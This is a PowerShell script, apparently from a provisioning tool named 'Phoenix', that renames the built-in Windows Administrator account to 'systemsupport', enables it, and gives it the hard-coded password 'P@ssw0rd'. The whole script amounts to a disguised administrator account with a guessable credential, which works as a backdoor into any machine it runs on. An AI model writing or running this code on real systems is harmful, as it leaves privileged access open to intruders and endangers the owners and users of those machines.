param(
    [Parameter(Mandatory = $true)]
    [string]$LogPath
)

$ErrorActionPreference = 'Stop'

function Write-PhoenixLog {
    param(
        [string]$Level,
        [string]$Message
    )

    $directory = Split-Path -Parent $LogPath
    if (-not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }

    Add-Content -LiteralPath $LogPath -Value "[$Level] $Message"
}

try {
    $builtInAdministrator = Get-CimInstance -ClassName Win32_UserAccount -Filter "LocalAccount=True" |
        Where-Object { $_.SID -match '-500$' } |
        Select-Object -First 1

    if ($null -eq $builtInAdministrator) {
        throw 'The built-in Administrator account (SID ending in -500) was not found.'
    }

    $existingSupportAccount = Get-CimInstance -ClassName Win32_UserAccount -Filter "LocalAccount=True" |
        Where-Object { $_.Name -ieq 'systemsupport' } |
        Select-Object -First 1

    if ($null -ne $existingSupportAccount -and $existingSupportAccount.SID -ne $builtInAdministrator.SID) {
        throw 'A different local account named systemsupport already exists.'
    }

    if ($builtInAdministrator.Name -ine 'systemsupport') {
        Invoke-CimMethod -InputObject $builtInAdministrator -MethodName Rename -Arguments @{ Name = 'systemsupport' } | Out-Null
        Write-PhoenixLog 'INFO' 'Renamed the built-in Administrator account to systemsupport.'
    }

    & net.exe user systemsupport 'P@ssw0rd' /active:yes | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "net user failed with exit code $LASTEXITCODE."
    }

    Write-PhoenixLog 'INFO' 'Enabled the systemsupport account and updated its password.'
    exit 0
}
catch {
    Write-PhoenixLog 'ERROR' $_.Exception.Message
    exit 1
}
